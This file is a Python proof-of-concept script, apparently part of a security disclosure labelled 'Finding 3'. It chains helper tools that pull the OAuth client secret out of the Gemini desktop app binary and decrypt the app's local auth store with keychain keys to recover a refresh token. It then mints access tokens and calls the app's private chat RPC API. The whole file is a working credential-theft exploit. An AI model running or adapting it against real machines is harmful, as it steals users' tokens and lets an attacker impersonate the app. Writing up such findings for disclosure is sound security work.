#!/usr/bin/env python3
"""Finding 3 — chat through the Gemini desktop app's private RPC API.

This client contains NO hardcoded credentials. On startup it re-runs the
extraction pipeline exactly as an attacker's process would:

    1. tools/extract_client_secret.py  -> client_id + client_secret (from binary)
    2. tools/decrypt_auth.py            -> refresh_token (from auth store + keychain)
    3. oauth2.googleapis.com/token     -> fresh access token
    4. robinfrontend-pa.googleapis.com/$rpc/.../StreamGenerate -> chat

Usage:
    python3 gemini_desktop_client.py "your message"
    python3 gemini_desktop_client.py            # verification mode (2 messages)
"""
import json
import os
import sys
import time
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'tools'))

TOKEN_URL = 'https://oauth2.googleapis.com/token'
API = ('https://robinfrontend-pa.googleapis.com'
       '/$rpc/assistant.mobile.robin.RobinService')


def collect_credentials():
    """Re-derive the app's identity from the local machine at runtime."""
    import extract_client_secret
    binary_info = extract_client_secret.extract(
        '/Applications/Gemini.app/Contents/MacOS/Gemini')

    import decrypt_auth
    data = open(decrypt_auth.AUTH_PATH, 'rb').read()
    keys = decrypt_auth.keychain_keys()
    pt, meta = decrypt_auth.decrypt_auth(data, keys)
    if pt is None:
        raise SystemExit('could not decrypt auth store')
    fields = decrypt_auth.parse_stored_credential(pt)
    refresh_token = fields.get('refresh_token') or fields.get('field_4')
    if not refresh_token:
        raise SystemExit('refresh_token not found in decrypted store')

    return {
        'client_id': binary_info['client_id'],
        'client_secret': binary_info['client_secret'],
        'refresh_token': refresh_token,
    }


def get_access_token(creds):
    """Mint a fresh access token with the app's own OAuth client."""
    body = urllib.parse.urlencode({
        'client_id': creds['client_id'],
        'client_secret': creds['client_secret'],
        'refresh_token': creds['refresh_token'],
        'grant_type': 'refresh_token',
    }).encode()
    req = urllib.request.Request(TOKEN_URL, data=body, headers={
        'Content-Type': 'application/x-www-form-urlencoded'})
    with urllib.request.urlopen(req, timeout=15) as r:
        d = json.load(r)
    if 'access_token' not in d:
        raise RuntimeError(f'token refresh failed: {d}')
    return d['access_token']


def rpc(token, method, payload):
    """Call a RobinService method via the Connect-JSON codec."""
    req = urllib.request.Request(
        f'{API}/{method}', data=json.dumps(payload).encode(),
        headers={'Authorization': f'Bearer {token}',
                 'Content-Type': 'application/json'})
    with urllib.request.urlopen(req, timeout=60) as r:
        return json.loads(r.read().decode())


def extract_reply(resp):
    texts = []

    def grab(node):
        if isinstance(node, str):
            texts.append(node)
        elif isinstance(node, list):
            for item in node:
                grab(item)
        elif isinstance(node, dict):
            if isinstance(node.get('text'), str):
                texts.append(node['text'])
            else:
                for key in ('textResponse', 'shareableTextResponse'):
                    if key in node:
                        grab(node[key])

    for root in (resp if isinstance(resp, list) else [resp]):
        if isinstance(root, dict):
            for mr in root.get('modelResponses', []):
                grab(mr.get('textResponse'))
    return texts


def chat(msg, token):
    t0 = time.time()
    resp = rpc(token, 'StreamGenerate', {'query': {'text': msg}})
    return extract_reply(resp), time.time() - t0, resp


if __name__ == '__main__':
    creds = collect_credentials()
    print('credentials collected at runtime: '
          f"client_id={creds['client_id'][:20]}… secret={creds['client_secret'][:8]}… "
          f"refresh_token={creds['refresh_token'][:5]}…")

    token = get_access_token(creds)
    print(f'access token minted: {token[:25]}…')

    if len(sys.argv) > 1:
        msg = ' '.join(sys.argv[1:])
        print(f'\nSending: {msg!r}')
        replies, dt, _ = chat(msg, token)
        for r in replies:
            print(f'\nGEMINI (desktop API, {dt:.1f}s):\n{r.strip()}')
    else:
        tests = ['What is 9 multiplied by 7? Reply with only the number.',
                 'Name the capital of Japan in one word.']
        ok = 0
        for msg in tests:
            print(f'\n--- {msg!r}')
            try:
                replies, dt, _ = chat(msg, token)
                if replies:
                    print(f'    reply: {replies[0].strip()!r}  ({dt:.1f}s)')
                    ok += 1
                else:
                    print('    no text in response')
            except Exception as e:
                print(f'    ERROR: {e}')
        print(f'\n=== {ok}/2 succeeded ===')
        if ok == 2:
            print('DESKTOP APP API SEND+RECEIVE: FULLY WORKING & REPEATABLE ✅')
